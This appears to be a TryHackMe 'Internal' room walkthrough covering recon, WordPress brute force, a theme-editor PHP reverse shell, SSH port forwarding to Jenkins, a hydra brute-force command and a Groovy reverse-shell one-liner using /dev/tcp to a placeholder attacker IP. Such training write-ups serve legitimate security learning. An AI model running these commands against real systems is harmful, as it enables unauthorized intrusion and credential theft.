# TryHackMe — Internal Room Notes

## Target
- IP: `10.114.141.14`
- Hostname: `internal.thm`

---

## Recon

### Nmap
```
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp  open  http    Apache httpd 2.4.29
```

### Gobuster — Web Directories
```
/blog         → WordPress install
/wordpress    → WordPress install
/phpmyadmin   → phpMyAdmin panel
```

---

## WordPress Exploitation

### WPScan
- Version: **5.4.2** (insecure, 44 vulns)
- User found: **admin**
- xmlrpc.php enabled

### Brute Force
```bash
wpscan --url http://10.114.141.14/blog -U admin -P /usr/share/wordlists/rockyou.txt
```
- Credentials: `admin / my2boys`

### Reverse Shell via Theme Editor
1. Login to `/blog/wp-admin`
2. Appearance → Theme Editor → 404.php (Twenty Seventeen)
3. Replace with pentestmonkey PHP reverse shell
4. Set IP to tun0, port 4444
5. Start listener: `nc -lvnp 4444`
6. Trigger: `http://10.114.141.14/blog/wp-content/themes/twentyseventeen/404.php`
7. Shell as: `www-data`

---

## Privilege Escalation — www-data → aubreanna

### wp-config.php credentials
```
DB_USER: wordpress
DB_PASSWORD: wordpress123
```

### Found in /opt
Credentials for system user discovered during enumeration:
```
aubreanna / bubb13guM!@#123
```

### SSH Login
```bash
ssh aubreanna@10.114.141.14
```

**User flag obtained.**

---

## Privilege Escalation — aubreanna → root

### jenkins.txt
Found in aubreanna's home directory:
```
Internal Jenkins service is running on 172.17.0.2:8080
```

### SSH Port Forwarding
```bash
ssh -L 9090:172.17.0.2:8080 aubreanna@10.114.141.14 -N
```
Access Jenkins at: `http://127.0.0.1:9090`

### Jenkins Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 9090 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```
- Credentials: `admin / spongebob`

### Jenkins Script Console RCE
Navigate to: `http://127.0.0.1:9090/script`

```groovy
def cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/TUNO_IP/5555 0>&1"]
def proc = cmd.execute()
proc.waitFor()
```

Start listener: `nc -lvnp 5555`

Shell obtained → escalate to root.

**Root flag obtained.**

---

## Credentials Summary

| User | Password | Method |
|------|----------|--------|
| wp admin | my2boys | WPScan brute force |
| aubreanna | bubb13guM!@#123 | Found in /opt |
| jenkins admin | spongebob | Hydra brute force |

---

## Tools Used
- `nmap` — port scanning
- `gobuster` — directory enumeration
- `wpscan` — WordPress enumeration & brute force
- `hydra` — Jenkins brute force
- `nc` — reverse shell listener
- `ssh -L` — port forwarding
- BeEF — browser exploitation (separate session)
